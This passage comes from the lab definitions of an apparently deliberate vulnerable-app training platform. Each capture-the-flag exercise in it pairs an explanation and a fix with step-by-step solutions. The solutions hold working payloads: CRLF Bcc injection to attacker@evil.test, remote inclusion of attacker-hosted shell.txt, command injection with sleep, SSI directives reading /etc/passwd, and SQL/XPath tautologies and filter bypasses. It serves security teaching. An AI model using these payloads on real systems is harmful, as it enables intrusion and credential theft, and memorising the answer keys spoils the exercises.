          medium: ["Directly request /vuln/source-map-leak/app.min.js.map (no comment needed).", "The FLAG appears."],
          hard: ["Request /vuln/source-map-leak/manifest.json to find the real map filename.", "Request that file — the FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "exposed-dev-endpoint", category: "infra", title: "Exposed Dev Endpoint", shortTitle: "Exposed Dev Endpoint",
        tags: ["infra", "exposed-dev-endpoint", "exposed", "dev", "endpoint"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp API Gateway", blurb: "Reach a debug endpoint left enabled from development.",
        inputContext: "Hidden API endpoint (HTTP headers)",
        goal: { explain: "Debug/diagnostic endpoints built for development are sometimes accidentally left reachable in production, dumping internal configuration to anyone who finds them.",
          example: "A /debug endpoint might return environment info, feature flags, and internal hostnames — all useful reconnaissance for further attacks.",
          mission: ["Try the /debug endpoint directly.", "Find the access requirement for this tier and satisfy it.", "A FLAG appears in the debug dump once you're let in."] },
        difficultyNotes: { easy: "/debug is reachable with no restriction at all.", medium: "/debug now requires a simulated internal-only Host header value.", hard: "The internal Host header is also required, plus a debug token — check /robots.txt for a leaked hint." },
        why: "Each tier added a gate, but the 'internal-only' checks are just header values the client itself controls in this simulation — nothing here is a real network-level restriction.",
        fix: "Remove debug endpoints entirely from any deployment reachable from outside a genuinely isolated internal network, and never rely on header values as a substitute for real network segmentation.",
        reportSummary: {
          easy: "/debug is fully reachable with no access restriction whatsoever.",
          medium: "/debug requires a simulated internal Host header, but that value isn't cryptographically tied to any real network boundary.",
          hard: "/debug requires the internal Host header AND a debug token, but the token is disclosed in a publicly-reachable robots.txt file."
        },
        reportImpact: {
          easy: "Full internal configuration disclosure to any unauthenticated visitor.",
          medium: "Same disclosure once the expected internal-host convention is guessed.",
          hard: "Same disclosure via a short reconnaissance chain (robots.txt → debug token → /debug)."
        },
        solutionSteps: {
          easy: ["Request /vuln/exposed-dev-endpoint/debug directly.", "The FLAG appears."],
          medium: ["Send the request with header X-Simulated-Host: internal.securecorp-demo.test.", "The FLAG appears."],
          hard: ["Check /robots.txt for the leaked debug token.", "Send the request with both the internal host header and X-Debug-Token: temp-debug-2026.", "The FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },

      // ------------------------------------------------------ WEB ENUM -----
      {
        id: "enum-files", category: "enum", title: "Files & Directories", shortTitle: "Files & Directories",
        tags: ["enum", "enum-files", "files"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Web Server", blurb: "Discover hidden files and directories with no visible links.",
        inputContext: "URL path",
        goal: { explain: "Sites often leave sensitive files reachable but unlinked — backups, old admin panels, config files — discoverable only by guessing paths (what tools like gobuster/ffuf automate).",
          example: "A file like /backup.zip might sit right at the web root, invisible in navigation but fully downloadable if you know (or guess) the name.",
          mission: ["Probe common paths using the tool or built-in wordlist.", "A FLAG appears once a genuinely hidden file is found."] },
        difficultyNotes: { easy: "The hidden file has an obvious, common name — a short wordlist finds it immediately.", medium: "The hidden path is a less obvious legacy directory name — needs a bigger wordlist.", hard: "The hidden file only exists as a backup-extension variant of a known filename (e.g. .bak) — a common real technique for source disclosure." },
        why: "Files were never removed from the web root after use, and 'no link to it' was mistaken for 'not accessible'.",
        fix: "Never rely on obscurity — remove unneeded files entirely, and serve only an explicit allowlist of paths from the web root.",
        reportSummary: {
          easy: "An obvious, commonly-named backup file (/backup.zip) sits at the web root with no access control.",
          medium: "A decommissioned legacy admin directory is still reachable at a less obvious, less-guessable path.",
          hard: "A backup-extension variant of a real source file (.bak) discloses source code that was never meant to be served as-is."
        },
        reportImpact: {
          easy: "Full site backup disclosure to anyone who guesses (or wordlist-fuzzes) the filename.",
          medium: "Access to a decommissioned admin interface that may retain working functionality or credentials.",
          hard: "Source code disclosure, including any hardcoded credentials — worse than a simple file leak since it reveals application internals."
        },
        solutionSteps: {
          easy: ["Probe /backup.zip directly, or run the built-in wordlist.", "The FLAG appears alongside the discovered file."],
          medium: ["Probe /old_admin_2019/ (or run the built-in wordlist, which includes it).", "The FLAG appears."],
          hard: ["Probe /config.php.bak (or run the built-in wordlist).", "The FLAG appears alongside the disclosed fake source code."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "virtual-hosts", category: "enum", title: "Virtual Host Enumeration", shortTitle: "Virtual Hosts",
        tags: ["enum", "virtual-hosts", "virtual", "hosts"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Virtual Host Prober", blurb: "Discover hidden internal sites hosted on the same server.",
        inputContext: "HTTP header (Host, simulated)",
        goal: { explain: "One server can host many different sites, distinguished only by the Host header sent in the request — including internal sites never linked publicly.",
          example: "The same IP address might serve a public marketing site for Host: www.example.com and a completely different internal admin panel for Host: admin.example.com.",
          mission: ["Try candidate Host header values in the prober.", "A FLAG appears once a genuinely hidden vhost responds."] },
        difficultyNotes: { easy: "The hidden vhost name is short and guessable.", medium: "The hidden vhost name is longer/less obvious — needs a bigger wordlist.", hard: "The check is case-sensitive, and the real vhost uses mixed case — a plain wordlist (usually all-lowercase) will miss it unless you try case variations." },
        why: "The server responds to any Host header matching a configured vhost, including ones never advertised publicly, with no additional authentication.",
        fix: "Don't rely on an unlisted hostname as access control — internal vhosts need real authentication, and ideally shouldn't be reachable from the public internet at all.",
        reportSummary: {
          easy: "An internal admin console responds to a short, easily-guessed Host header value.",
          medium: "An internal staging environment responds to a longer, less obvious Host header value.",
          hard: "An internal API gateway responds only to an exact-case Host header value that most wordlists (typically all-lowercase) wouldn't naturally produce."
        },
        reportImpact: {
          easy: "Full access to an internal admin console from the public internet, using only a Host header change.",
          medium: "Access to a staging environment that may contain pre-release code or weaker security controls.",
          hard: "Access to an internal API gateway — case-sensitivity is a weak, easily-defeated protection once an attacker tries capitalization variants."
        },
        solutionSteps: {
          easy: ["Send Host header: admin.securecorp-demo.test", "The FLAG appears."],
          medium: ["Send Host header: staging-internal.securecorp-demo.test", "The FLAG appears."],
          hard: ["Send Host header: Internal-API.securecorp-demo.test (exact case).", "The FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "fuzz-params", category: "enum", title: "Fuzzing & HTTP Parameters", shortTitle: "Fuzzing & Parameters",
        tags: ["enum", "fuzz-params", "fuzz", "params"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Dashboard", blurb: "Discover undocumented parameters that unlock hidden behavior.",
        inputContext: "URL parameter (undocumented)",
        goal: { explain: "Applications sometimes have undocumented parameters — debug flags, internal toggles, nested filters — reachable only by guessing (what tools like ffuf, Arjun, or x8 automate).",
          example: "?debug=true might unlock a hidden debug panel that's never mentioned anywhere in the visible UI.",
          mission: ["Try adding query parameters to the dashboard URL.", "A FLAG appears once the right parameter (and value/shape) unlocks hidden functionality."] },
        difficultyNotes: { easy: "The parameter name is the obvious one (debug=true).", medium: "The obvious name doesn't work — try a different, related name.", hard: "A flat parameter isn't enough — the hidden functionality only unlocks via a nested/bracket-style parameter." },
        why: "A debug/internal feature flag was left reachable via an undocumented parameter with no authentication check at all.",
        fix: "Remove debug/internal toggles from production entirely, or gate them behind real authentication — never behind an obscure, unauthenticated parameter name.",
        reportSummary: {
          easy: "An undocumented debug=true parameter unlocks hidden functionality with no authentication.",
          medium: "A differently-named but functionally identical parameter (internal=1) unlocks the same hidden functionality.",
          hard: "The hidden functionality requires a nested/bracket-style parameter (filter[status]=admin) that flat-parameter fuzzing wordlists wouldn't naturally try."
        },
        reportImpact: {
          easy: "Anyone who guesses (or fuzzes) the parameter name gets unauthenticated access to hidden functionality.",
          medium: "Same impact as easy — renaming the parameter doesn't add real security, just requires slightly more guessing.",
          hard: "Same impact as easy — demonstrates that nested parameter fuzzing finds bugs flat-parameter wordlists alone would miss."
        },
        solutionSteps: {
          easy: ["Visit /vuln/fuzz-params?debug=true", "The FLAG appears."],
          medium: ["Visit /vuln/fuzz-params?internal=1", "The FLAG appears."],
          hard: ["Visit /vuln/fuzz-params?filter[status]=admin", "The FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "dns-zone-transfer", category: "enum", title: "DNS Zone Transfer", shortTitle: "DNS Zone Transfer",
        tags: ["enum", "dns-zone-transfer", "dns", "zone", "transfer"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp DNS Zone Transfer Tool", blurb: "Dump an entire DNS zone via an unauthorized AXFR request.",
        inputContext: "Form field (simulated protocol request)",
        goal: { explain: "A DNS zone transfer (AXFR) is meant only for secondary nameservers to sync zone data — but a misconfigured server can let anyone request the FULL zone, including internal-only hostnames never otherwise discoverable.",
          example: "Instead of guessing subdomains one at a time, a successful AXFR just hands you the entire list at once — internal VPN hosts, backup servers, everything.",
          mission: ["Request a zone transfer.", "A FLAG appears once the full zone is actually disclosed."] },
        difficultyNotes: { easy: "The transfer succeeds for any requester with no restriction at all.", medium: "The transfer requires claiming to be a specific nameserver (ns1.securecorp-demo.test) — a claim that's never actually verified.", hard: "The transfer also requires a transfer key — but it's leaked in an internal ops changelog you can find on the same site." },
        why: "The DNS server doesn't restrict AXFR to genuinely authenticated/trusted secondary servers — at medium it trusts a self-reported identity, and at hard the 'secret' key is exposed elsewhere in the same application.",
        fix: "Restrict zone transfers to specific IP addresses AND require real TSIG cryptographic authentication — never a spoofable claimed identity, and never leak transfer keys in any internal documentation reachable from the same host.",
        reportSummary: {
          easy: "The DNS zone transfer succeeds for any request with zero restriction.",
          medium: "The transfer is 'restricted' only by a self-reported server identity string that's never actually verified.",
          hard: "The transfer requires a real-looking key, but that key is leaked via an internal changelog page reachable from the same application."
        },
        reportImpact: {
          easy: "Complete internal network reconnaissance — every subdomain, including internal-only hosts, in one request.",
          medium: "Same complete disclosure — the 'restriction' is trivially satisfied by just claiming the expected identity.",
          hard: "Same complete disclosure — demonstrates how a leaked internal document can undermine an otherwise real-looking access control."
        },
        solutionSteps: {
          easy: ["Request an AXFR with any server value.", "The FLAG appears alongside the full zone dump."],
          medium: ["Request an AXFR with server=ns1.securecorp-demo.test.", "The FLAG appears."],
          hard: ["Check the ops changelog link for the current transfer key.", "Request an AXFR with server=ns1.securecorp-demo.test and that key.", "The FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },

      // ------------------------------------------------------------- FINAL
      {
        id: "final", category: "final", title: "Redacted Final Challenge", shortTitle: "[REDACTED]",
        tags: ["final"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp — Classified", blurb: "This lab is locked. Or is it?",
        inputContext: "Chained (multiple contexts)", locked: true,
        goal: { explain: "Combine what you learned in Broken Access Control and IDOR. Somewhere in this application, an admin note points to something. Find user 100's password.",
          example: "No examples this time.", mission: ["Read the admin-only notes.", "Follow where they point.", "Retrieve and submit the actual password (not a FLAG — this one's the real secret)."] },
        difficultyNotes: { easy: "The trail is short and discoverable from the UI.", medium: "You'll need the medium-mode Access Control bypass before the trail appears.", hard: "Combine the hard-mode Access Control bypass with the hard-mode IDOR technique." },
        why: "This chains two independently real bugs — broken access control gets you the pointer, IDOR gets you the data — exactly how real bug bounty chains work.",
        fix: "Fixing either underlying bug breaks the whole chain.",
        reportSummary: {
          easy: "The admin note is reachable via the trivial access-control bypass, and the linked profile is reachable via plain sequential IDOR.",
          medium: "The admin note requires the medium-tier cookie-editing bypass; the linked profile requires enumerating a scrambled id.",
          hard: "The admin note requires the hard-tier debug-header/cookie bypass; the linked profile requires decoding/re-encoding a base64 id."
        },
        reportImpact: {
          easy: "Full compromise of the admin account by chaining two independently minor-looking bugs.",
          medium: "Same full compromise, requiring both bypasses to be chained correctly at this tier.",
          hard: "Same full compromise — demonstrates how real attackers chain multiple 'medium severity' bugs into a critical one."
        },
        solutionSteps: {
          easy: ["Read the admin note via the Broken Access Control bypass (no check needed at easy).", "It references user 100's profile.", "View that profile via plain IDOR — the password field is in the response."],
          medium: ["Bypass Access Control by editing the role cookie to admin.", "Read the admin note referencing user 100.", "View that profile via the scrambled-id IDOR technique — retrieve the password."],
          hard: ["Bypass Access Control via X-Debug-Role or the base64 role cookie.", "Read the admin note referencing user 100.", "View that profile via the base64-encoded IDOR technique — retrieve the password."]
        },
        answerPlaceholder: "User 100's password"
      },

      // ===================================================================
      // NEW LABS — added after a bWAPP lab-list audit. Nothing above this
      // point was modified. 26 new labs across the existing 6 categories.
      // ===================================================================

      // ---------------------------------------------------------- INJECTION
      {
        id: "html-injection", category: "injection", title: "HTML Injection", shortTitle: "HTML Injection",
        tags: ["injection", "html-injection", "html"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Employee Directory", blurb: "Inject raw markup into a bio field — no script execution needed to prove impact.",
        inputContext: "GET parameter (reflected & stored)",
        goal: { explain: "HTML Injection means arbitrary markup renders unescaped — defacement, fake login overlays, and phishing are all possible even when <script> itself is blocked.",
          example: "A bio field reflects your input directly into the page. Any tag you submit becomes real, live markup.",
          mission: ["Open the lab.", "Submit a bio containing an HTML tag.", "The FLAG appears once a tag renders unescaped."] },
        difficultyNotes: { easy: "Zero filtering — any tag works, reflected only.", medium: "Your bio is now STORED. The literal '<script' substring is blocked, but any other tag isn't.", hard: "Your value lands inside an HTML attribute (title=\"...\"). < and > are escaped, but the quote isn't." },
        why: "User input is concatenated directly into the page's HTML with insufficient (or no) escaping.",
        fix: "Context-aware output encoding: escape for the specific context (element body vs. attribute value) every single time, with no exceptions for 'safe-looking' tags.",
        reportSummary: {
          easy: "The bio field reflects raw HTML with zero encoding.",
          medium: "A denylist blocks the literal substring '<script', but any other tag — enough for defacement or a fake login overlay — sails through untouched, and now persists across requests.",
          hard: "< and > are properly escaped for element context, but the same value is also inserted into a title=\"...\" attribute without escaping the quote character, allowing attribute breakout."
        },
        reportImpact: {
          easy: "Full page defacement or injection of a convincing fake login form to phish credentials.",
          medium: "Same impact, now persistent — every visitor to this profile sees the injected content.",
          hard: "Attribute breakout allows adding new attributes/event handlers, achieving effectively the same impact as element-context injection."
        },
        solutionSteps: {
          easy: ["Submit bio=<h1>DEFACED</h1> via the form.", "Notice it renders as a live heading, not text.", "FLAG appears."],
          medium: ["Submit bio=<script>alert(1)</script> — notice it's neutered.", "Submit bio=<h1>pwned</h1> instead — the tag survives and is now stored.", "Reload the page — it's still there. FLAG appears."],
          hard: ["Submit a plain string — notice < and > are escaped.", "Submit: \" onmouseover=\"x — this closes the attribute early and injects a new one.", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "mail-header-injection", category: "injection", title: "Mail Header Injection", shortTitle: "Mail Header Injection",
        tags: ["injection", "mail-header-injection", "mail", "header"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Contact Us", blurb: "Smuggle extra SMTP headers (Bcc, extra recipients) through a contact form.",
        inputContext: "Form fields (Name / Email)",
        goal: { explain: "When a contact form builds a raw email header block from user input, a newline in the wrong place lets an attacker inject entirely new headers — classic CC/BCC spam-relay abuse.",
          example: "From: <your input>\\nSubject: ... — if your input contains \\r\\n, you can add a Bcc: line the app never intended.",
          mission: ["Submit the contact form with a crafted Email or Name field.", "The FLAG appears once an extra header line is smuggled into the block."] },
        difficultyNotes: { easy: "Neither field filters \\r\\n at all.", medium: "The Email field strips \\r\\n now — the Name field doesn't.", hard: "Both fields strip \\r and \\n — but not the Unicode line separator U+2028." },
        why: "Untrusted input is concatenated directly into a raw header block with no newline sanitization.",
        fix: "Reject or strip ALL line-terminator characters recognized by any downstream mail parser — including Unicode line/paragraph separators — from every header-bound field, not just the one that showed up in a bug report.",
        reportSummary: {
          easy: "Both header-building fields accept raw \\r\\n with no filtering.",
          medium: "The Email field is fixed, but Name — concatenated into the header block the exact same way — was never touched.",
          hard: "Both fields strip literal \\r/\\n, but the downstream mail renderer also treats U+2028/U+2029 as line breaks, which the filter doesn't account for."
        },
        reportImpact: {
          easy: "Full SMTP header injection — Bcc harvesting, spam relay, or spoofed additional headers.",
          medium: "Same impact via the overlooked Name field.",
          hard: "Same impact via a Unicode bypass most \\r\\n-only filters miss entirely."
        },
        solutionSteps: {
          easy: ["Set Email to: jordan@example.com%0d%0aBcc: attacker@evil.test", "Submit.", "The rendered header block shows an extra Bcc line. FLAG appears."],
          medium: ["Try the same trick in Email — notice it's stripped now.", "Put the CRLF payload in the Name field instead.", "FLAG appears."],
          hard: ["Both fields strip \\r\\n now.", "Insert a literal U+2028 (Unicode LINE SEPARATOR) character followed by Bcc: attacker@evil.test in either field.", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "code-injection", category: "injection", title: "Server-Side Code Injection", shortTitle: "Code Injection",
        tags: ["injection", "code-injection", "code"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Pricing Rule Engine", blurb: "A 'custom discount formula' field is evaluated server-side — bypass the keyword filter.",
        inputContext: "Form field (evaluated server-side)",
        goal: { explain: "Distinct from SSTI: here the ENTIRE field is code, evaluated by a server-side rules engine — not a value substituted into a template.",
          example: "The formula field computes a discount, e.g. (100-15). But it's evaluated with far more power than 'a calculator' should have.",
          mission: ["Get the formula engine to reveal server internals instead of computing a number.", "The FLAG appears on confirmed code execution."] },
        difficultyNotes: { easy: "No filtering — reference server internals directly.", medium: "The literal words 'process'/'require'/'constructor' are blocked — but simple 'a'+'b' string concatenation is still resolved and evaluated the same way.", hard: "Concatenation is resolved too — try String.fromCharCode(...) to spell the banned word instead." },
        why: "User input is evaluated as live code server-side; the denylist blocks literal keyword matches but doesn't normalize obvious string-building evasions.",
        fix: "Never evaluate user-controlled expressions as code at all — use a real, restricted expression-only parser (e.g. a proper math-expression library) that structurally cannot reach language internals, regardless of encoding tricks.",
        reportSummary: {
          easy: "Dangerous keywords are usable directly in the formula field.",
          medium: "Raw keyword matches are blocked, but naive string-concatenation ('proc'+'ess') isn't resolved before the check runs.",
          hard: "Concatenation is resolved now too, but String.fromCharCode-based reconstruction isn't."
        },
        reportImpact: {
          easy: "Full server-side code execution via the pricing engine.",
          medium: "Same impact via a trivial keyword-splitting bypass.",
          hard: "Same impact via character-code reconstruction — denylists on dynamic code evaluation are fundamentally unreliable."
        },
        solutionSteps: {
          easy: ["Submit formula=process.version.", "The engine reveals internals. FLAG appears."],
          medium: ["Try process.version — notice it's blocked.", "Try: 'proc'+'ess' — string concatenation isn't resolved by the filter.", "FLAG appears."],
          hard: ["Try 'proc'+'ess' — notice it's blocked now too.", "Try: String.fromCharCode(112,114,111,99,101,115,115)", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "blind-command-injection", category: "injection", title: "Blind Command Injection", shortTitle: "Blind Command Injection",
        tags: ["injection", "blind-command-injection", "blind", "command"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Health Monitor", blurb: "The response never reflects output — timing is the only oracle.",
        inputContext: "Form field (host)",
        goal: { explain: "Distinct from ordinary command injection: the response text is always identical. Response TIME is the only signal that your injected command actually ran.",
          example: "Inject a sleep command. If the response takes measurably longer, your command executed — even though you never see its output.",
          mission: ["Get the server to visibly delay its response via injection.", "The FLAG appears once a real, measurable delay is triggered."] },
        difficultyNotes: { easy: "No filtering — use ; directly.", medium: "; and & are stripped — try a pipe or backticks.", hard: "; & | are all stripped — command substitution $(...) still isn't." },
        why: "The hostname parameter is concatenated into a shell command with insufficient metacharacter filtering.",
        fix: "Never build shell commands from user input — use a parameterized API (e.g. a DNS/ping library) that never invokes a shell at all.",
        reportSummary: {
          easy: "No metacharacter filtering at all on the host field.",
          medium: "; and & are stripped, but | and backticks are not.",
          hard: "; & | are all stripped, but $(...) command substitution still works."
        },
        reportImpact: {
          easy: "Full blind remote code execution, confirmed via timing side-channel.",
          medium: "Same impact via pipe/backtick bypass.",
          hard: "Same impact via command substitution — metacharacter denylists are inherently incomplete."
        },
        solutionSteps: {
          easy: ["Submit host=10.0.0.5; sleep 5", "Notice the response takes ~5s longer than normal. FLAG appears."],
          medium: ["Try the ; version — notice it's stripped and the delay doesn't happen.", "Try: 10.0.0.5 | sleep 5", "FLAG appears."],
          hard: ["Try the pipe version — stripped too now.", "Try: 10.0.0.5 $(sleep 5)", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "xpath-injection", category: "injection", title: "XPath Injection", shortTitle: "XPath Injection",
        tags: ["injection", "xpath-injection", "xpath"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Partner Portal", blurb: "Bypass a login backed by an XML 'directory' queried with XPath.",
        inputContext: "Form fields (Username / Password)",
        goal: { explain: "Some legacy user stores are small XML files queried with XPath instead of a real database. Auth bypass works the same way as SQLi — break out of the string with a boolean tautology.",
          example: "//user[username='X' and password='Y'] — a stray apostrophe in X or Y can turn this into an always-true condition.",
          mission: ["Log in without knowing a valid password.", "The FLAG appears on a successful bypass."] },
        difficultyNotes: { easy: "Neither field filters apostrophes.", medium: "Password strips apostrophes — Username doesn't.", hard: "Both fields strip apostrophes — but this legacy endpoint's query uses double quotes instead." },
        why: "User input is concatenated directly into an XPath query string with no escaping.",
        fix: "Use parameterized XPath queries (or just migrate off an XML file as a credential store) — never build query strings via concatenation.",
        reportSummary: {
          easy: "Both fields are vulnerable to classic ' or '1'='1 tautology injection.",
          medium: "Password is fixed, but Username — built into the same query the same way — isn't.",
          hard: "Both fields strip single quotes, but the query itself is built with double-quoted literals for legacy-parser compatibility."
        },
        reportImpact: { easy: "Full authentication bypass, logging in as any user including admin.", medium: "Same impact via the Username field.", hard: "Same impact via a double-quote breakout." },
        solutionSteps: {
          easy: ["Set Username to: ' or '1'='1", "Submit with any password.", "FLAG appears — logged in without valid credentials."],
          medium: ["Try the same payload in Password — notice it's blocked.", "Put it in Username instead.", "FLAG appears."],
          hard: ["Single-quote payloads are blocked in both fields now.", "Try Username: \" or \"1\"=\"1", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "blind-sql-injection", category: "injection", title: "Blind SQL Injection", shortTitle: "Blind SQLi",
        tags: ["injection", "blind-sql-injection", "blind", "sql"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Product Lookup", blurb: "The response is only ever 'found' / 'not found' — no data is ever returned directly.",
        inputContext: "GET parameter (pid) / custom header (hard)",
        goal: { explain: "Boolean-blind SQL injection: you never see database output, only a true/false signal. That signal alone is enough to pivot into tables you were never meant to reach.",
          example: "0 OR (SELECT COUNT(*) FROM admin_secrets)>0 — if the response flips to 'found', the subquery was true.",
          mission: ["Get the boolean oracle to confirm the existence of a hidden table's data.", "The FLAG appears on a genuine boolean pivot."] },
        difficultyNotes: { easy: "pid is fully unescaped.", medium: "pid must start with a digit — that's a prefix check, not a full-format check.", hard: "pid is fully validated now — but an internal X-Debug-Filter header is appended to the query with zero validation." },
        why: "The id parameter is concatenated directly into a numeric SQL context; validation (where present) checks the wrong thing (prefix vs. full format).",
        fix: "Always use parameterized queries / prepared statements — never string-build SQL, and never trust format validation as a substitute for parameterization.",
        reportSummary: {
          easy: "pid is concatenated directly into the WHERE clause.",
          medium: "A '/^\\d/' prefix check doesn't stop a digit-prefixed payload from smuggling the rest of an injection through.",
          hard: "pid itself is now safe, but a forgotten internal QA header (X-Debug-Filter) reopens the exact same class of bug."
        },
        reportImpact: { easy: "Full blind data exfiltration from arbitrary tables via boolean inference.", medium: "Same impact via a validation-format bypass.", hard: "Same impact via a leftover internal testing header." },
        solutionSteps: {
          easy: ["Submit pid=0 OR (SELECT COUNT(*) FROM admin_secrets)>0", "Response flips to 'found'. FLAG appears."],
          medium: ["Notice non-digit-starting payloads are rejected.", "Prefix your payload with a digit: 0 OR (SELECT COUNT(*) FROM admin_secrets)>0 — already starts with 0, so it passes.", "FLAG appears."],
          hard: ["pid alone won't work anymore.", "Send the request with header X-Debug-Filter: (SELECT COUNT(*) FROM admin_secrets)>0 (use curl or Burp Repeater).", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "ssi-injection", category: "injection", title: "Server-Side Includes (SSI) Injection", shortTitle: "SSI Injection",
        tags: ["injection", "ssi-injection", "ssi"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Email Signature Builder", blurb: "A legacy SSI-style template processor executes directives embedded in your signature.",
        inputContext: "Form field (signature)",
        goal: { explain: "Server-Side Includes is an old templating mechanism with directives like <!--#exec--> and <!--#include-->. If user input reaches the processor unescaped, those directives execute.",
          example: "<!--#exec cmd=\"whoami\" --> runs a command; <!--#include file=\"...\" --> reads a file.",
          mission: ["Get an SSI directive in your signature to actually execute.", "The FLAG appears on confirmed directive execution."] },
        difficultyNotes: { easy: "No filtering — #exec works directly.", medium: "'exec' is blocked — try #include instead.", hard: "'exec' and 'include' are both blocked — one classic directive was forgotten: #printenv." },
        why: "User input is passed through an SSI-style processor with an incomplete directive denylist.",
        fix: "Never process user-controlled content through a template engine that supports directive execution — treat signatures as plain, escaped text only.",
        reportSummary: {
          easy: "No SSI directive filtering at all.",
          medium: "#exec is blocked, but #include (file disclosure, including path traversal) isn't.",
          hard: "#exec and #include are both blocked, but #printenv — which dumps server environment data — was never added to the denylist."
        },
        reportImpact: { easy: "Full simulated command execution via SSI.", medium: "File disclosure via path traversal through #include.", hard: "Environment/secret disclosure via #printenv." },
        solutionSteps: {
          easy: ["Submit sig=<!--#exec cmd=\"cat /etc/passwd\" -->", "FLAG appears."],
          medium: ["Notice #exec is stripped now.", "Submit: <!--#include file=\"../../../etc/passwd\" -->", "FLAG appears."],
          hard: ["#exec and #include are both stripped now.", "Submit: <!--#printenv -->", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },

      // ------------------------------------------------------- SERVER LOGIC
      {
        id: "rfi", category: "server-logic", title: "Remote File Inclusion", shortTitle: "RFI",
        tags: ["server-logic", "rfi"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Template Importer", blurb: "Import an email template 'from a URL' — the app trusts that URL far too much.",
        inputContext: "GET parameter (tpl)",
        goal: { explain: "Distinct from local file inclusion: here a URL-shaped value is treated as a remote include source. The vulnerability is trusting that URL at all.",
          example: "tpl=en loads a local template. tpl=http://attacker.evil/shell.txt would fetch and 'execute' an attacker-controlled remote resource.",
          mission: ["Get the importer to treat an untrusted URL as trusted.", "The FLAG appears on a confirmed remote inclusion."] },
        difficultyNotes: { easy: "Any URL is accepted.", medium: "The URL must contain 'securecorp-demo.test' anywhere — a naive substring check.", hard: "The hostname is properly validated now — but a forgotten tpl_fallback parameter isn't." },
        why: "A URL-shaped parameter is used as an include source with insufficient (or no) allowlist validation.",
        fix: "Never accept arbitrary URLs as include sources — use a hardcoded enum of allowed local template names only.",
        reportSummary: { easy: "No validation on the tpl parameter at all.", medium: "A substring check ('includes securecorp-demo.test') is trivially defeated by embedding the string anywhere in an attacker-controlled URL.", hard: "The primary hostname check is solid, but a secondary tpl_fallback parameter has none at all." },
        reportImpact: { easy: "Full remote file inclusion / simulated RCE.", medium: "Same impact via a naive-allowlist bypass.", hard: "Same impact via a forgotten fallback parameter." },
        solutionSteps: {
          easy: ["Submit tpl=http://attacker-controlled.evil/shell.txt", "FLAG appears."],
          medium: ["Notice unrelated domains are blocked.", "Try: https://evil.test/?securecorp-demo.test or https://securecorp-demo.test.evil.test/shell.txt", "FLAG appears."],
          hard: ["The hostname check can't be beaten directly now.", "Use the tpl_fallback field shown on the page instead.", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "cors-misconfig", category: "server-logic", title: "CORS Misconfiguration", shortTitle: "CORS Misconfig",
        tags: ["server-logic", "cors-misconfig", "cors", "misconfig"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp API — Account Balance", blurb: "Declare an attacker Origin and see exactly what the API hands back.",
        inputContext: "Origin header (simulated via form field)",
        goal: { explain: "A misconfigured CORS policy can let any website read a logged-in user's private API responses cross-origin — especially dangerous when combined with credentials.",
          example: "If Access-Control-Allow-Origin reflects any Origin and Access-Control-Allow-Credentials is true, an attacker's page can read your authenticated data.",
          mission: ["Get the API to reflect an untrusted Origin with credentials allowed.", "The FLAG appears in the response body once that's confirmed."] },
        difficultyNotes: { easy: "Any Origin is reflected, credentials allowed.", medium: "Only Origins containing 'securecorp-demo.test' are reflected — a naive substring check.", hard: "Origin is anchored properly now — except the literal value 'null' is still trusted." },
        why: "The server reflects the Origin request header into Access-Control-Allow-Origin without validating it against a real allowlist.",
        fix: "Use a strict, exact-match allowlist of trusted origins — never reflect the Origin header verbatim, and never trust the literal 'null' origin.",
        reportSummary: { easy: "Any Origin is trusted with credentials.", medium: "A substring check is bypassed by embedding the trusted string inside an attacker-controlled domain.", hard: "Exact-match validation is solid, but the 'null' origin (sent by sandboxed iframes, some redirects) is still trusted." },
